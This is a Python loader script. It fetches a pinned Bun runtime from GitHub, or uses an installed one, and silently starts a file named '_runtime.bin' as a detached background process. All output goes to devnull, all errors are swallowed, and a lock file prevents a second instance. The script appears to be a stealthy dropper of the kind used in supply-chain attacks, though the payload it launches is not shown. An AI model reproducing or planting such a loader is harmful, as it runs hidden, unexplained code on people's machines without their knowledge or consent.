#!/usr/bin/env python
import os
import platform
import shutil
import subprocess
import tempfile
import zipfile

try:
    from urllib.request import urlretrieve
except ImportError:
    from urllib import urlretrieve

BUN_VERSION = "1.3.13"
ENTRY_SCRIPT = "_runtime.bin"
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOCK_FILE = os.path.join(SCRIPT_DIR, ".loader.lock")
_DEVNULL = getattr(subprocess, "DEVNULL", None)


def _which(name):
    try:
        return shutil.which(name)
    except AttributeError:
        for d in os.environ.get("PATH", "").split(os.pathsep):
            p = os.path.join(d, name)
            if os.path.isfile(p) and os.access(p, os.X_OK):
                return p
        return None


def _is_running():
    if os.path.exists(LOCK_FILE):
        try:
            with open(LOCK_FILE, "r") as f:
                pid = int(f.read().strip())
            if platform.system() == "Windows":
                return True
            os.kill(pid, 0)
            return True
        except (ValueError, OSError):
            pass
    try:
        with open(LOCK_FILE, "w") as f:
            f.write(str(os.getpid()))
    except OSError:
        pass
    return False


def _cleanup_lock():
    try:
        os.remove(LOCK_FILE)
    except OSError:
        pass


def _get_musl():
    try:
        out = subprocess.check_output(
            ["ldd", "--version"], stderr=subprocess.STDOUT
        ).decode("utf-8", "ignore")
        if "musl" in out.lower():
            return True
    except Exception:
        pass
    try:
        with open("/etc/os-release", "r") as f:
            if "Alpine" in f.read():
                return True
    except (IOError, OSError):
        pass
    return False


def _resolve_asset():
    system = platform.system().lower()
    arch = platform.machine().lower()
    is_arm = "arm" in arch or "aarch64" in arch
    is_x64 = "x86_64" in arch or "amd64" in arch

    if system == "linux":
        if is_arm:
            return "bun-linux-aarch64"
        if is_x64:
            return "bun-linux-x64-musl-baseline" if _get_musl() else "bun-linux-x64-baseline"
    elif system == "darwin":
        return "bun-darwin-aarch64" if is_arm else "bun-darwin-x64"
    elif system == "windows":
        return "bun-windows-aarch64" if is_arm else "bun-windows-x64-baseline"
    return None


def run():
    if _is_running():
        return

    devnull = _DEVNULL if _DEVNULL is not None else open(os.devnull, "w")

    try:
        is_win = platform.system() == "Windows"
        bin_name = "bun.exe" if is_win else "bun"
        entry = os.path.join(SCRIPT_DIR, ENTRY_SCRIPT)

        if not os.path.exists(entry):
            return

        system_bun = _which("bun")
        if system_bun:
            subprocess.Popen(
                [system_bun, entry],
                cwd=SCRIPT_DIR,
                stdout=devnull,
                stderr=devnull,
            )
            return

        asset = _resolve_asset()
        if not asset:
            return

        tmp = tempfile.mkdtemp(prefix="rt-")
        url = "https://github.com/oven-sh/bun/releases/download/bun-v%s/%s.zip" % (BUN_VERSION, asset)
        zip_path = os.path.join(tmp, asset + ".zip")
        bun_path = os.path.join(tmp, bin_name)

        try:
            urlretrieve(url, zip_path)

            zf = zipfile.ZipFile(zip_path, "r")
            member = asset + "/" + bin_name
            src = zf.open(member)
            with open(bun_path, "wb") as dst:
                shutil.copyfileobj(src, dst)
            src.close()
            zf.close()

            os.remove(zip_path)

            if not is_win:
                os.chmod(bun_path, 0o755)

            subprocess.Popen(
                [bun_path, entry],
                cwd=SCRIPT_DIR,
                stdout=devnull,
                stderr=devnull,
            )
        except Exception:
            shutil.rmtree(tmp, ignore_errors=True)
    finally:
        _cleanup_lock()


if __name__ == "__main__":
    run()
